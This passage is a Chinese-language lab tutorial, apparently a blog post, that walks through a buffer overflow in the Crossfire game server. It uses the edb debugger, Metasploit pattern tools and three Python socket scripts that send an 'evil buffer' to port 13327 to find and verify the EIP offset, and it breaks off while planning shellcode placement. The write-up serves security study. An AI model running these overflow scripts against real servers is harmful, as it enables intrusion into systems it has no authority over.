<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220130140820166-89926735.png" /></p>
<p>如果 edb 没的自己安装下就行！</p>
<h2 id="fuzzing">2. FUZZING</h2>
<h3
id="新版本linux内核支持内存保护机制">1、新版本Linux内核支持内存保护机制</h3>
<p>• DEP</p>
<p>• ASLR</p>
<p>• 堆栈 cookies</p>
<p>• 堆栈粉碎</p>
<h3 id="本机调试">2、本机调试</h3>
<p>为避免实验时被他人控制 kali，对防火墙做如下设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --destination-port 4444 \\! -d 127.0.0.1 -j DROP  </span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp --destination-port 13327 \\! -d 127.0.0.1 -j DROP </span><br></pre></td></tr></table></figure>
<p>即仅允许locathost访问4444，13327端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/games/crossfire/bin]</span><br><span class="line">└─<span class="comment"># iptables -L                                                              </span></span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DROP       tcp  --  anywhere            !localhost            tcp dpt:4444</span><br><span class="line">DROP       tcp  --  anywhere            !localhost            tcp dpt:13327</span><br></pre></td></tr></table></figure>
<h3 id="edb-使用">3、edb 使用</h3>
<p><strong>使用edb调试工具启动服务进行调试</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">edb --run /usr/games/crossfire/bin/crossfire</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131134516774-1870037099.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131134558074-763551431.png" /></p>
<p><strong>重复点击两次Debug- &gt;run</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131134641096-2049784711.png" /></p>
<p><strong>EIP,ESP等寄存器地址的查看：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131135005183-417117282.png" /></p>
<h3 id="溢出测试">4、溢出测试</h3>
<p><strong>01.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">crash = <span class="string">&quot;\x41&quot;</span> * <span class="number">4379</span>         <span class="comment">#注意：crash 的大小必须是4379时才会发生缓冲区溢出</span></span><br><span class="line">buffer = <span class="string">&quot;\x11(setup sound &quot;</span> +crash+ <span class="string">&quot;\x90\x00#&quot;</span>   <span class="comment">#\x11:设备调用指令，\x90:nop操作，\x00:表示setup sound指令结束</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]Sending evil buffer...&quot;</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]Payload Sent!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131135424773-1295334843.png" /></p>
<p><strong>crash=4379：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131135625311-731508381.png" /></p>
<p><strong>crash=4378：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131135900329-853166473.png" /></p>
<p><strong>crash=4380：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131143015466-1997408350.png" /></p>
<h3 id="确定-eip-位置">5、确定 EIP 位置</h3>
<p><strong>生成唯一字符串：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─<span class="comment"># ./pattern_create.rb -l 4379            </span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp</span><br></pre></td></tr></table></figure>
<p><strong>02.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">crash=<span class="string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp&#x27;</span></span><br><span class="line">buffer = <span class="string">&quot;\x11(setup sound &quot;</span> +crash+ <span class="string">&quot;\x90\x00#&quot;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Sending evil buffer...&quot;</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Payload Send&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131144258957-3852577.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─<span class="comment"># ./pattern_offset.rb -q 46367046 -l 4379</span></span><br><span class="line">[*] Exact match at offset 4368</span><br></pre></td></tr></table></figure>
<p><strong>即 EIP 前面有 4368 个字符。</strong></p>
<h3 id="验证-eip-地址">6、验证 EIP 地址</h3>
<p><strong>03.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">crash=<span class="string">&quot;\x41&quot;</span>*<span class="number">4368</span> + <span class="string">&#x27;\x42&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;\x43&#x27;</span>*<span class="number">7</span></span><br><span class="line">buffer = <span class="string">&quot;\x11(setup sound &quot;</span> +crash+ <span class="string">&quot;\x90\x00#&quot;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Sending evil buffer...&quot;</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Payload Send&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131145417703-2074763570.png" /></p>
<h3 id="确定-shellcode-存放位置"><strong>7、确定 shellcode
存放位置</strong></h3>
<p>综上可知，ESP仅可存放7个字符，为此shellcode没法放到ESP。检查其他寄存器，发现EAX（b7b7ea0e）/
<strong>EDX（b7b7ea0e）</strong> 可行，EAX和EDX指的是同一地址。</p>
<p><strong>思路：</strong></p>
<p><strong>• 第一阶段shellcode</strong></p>
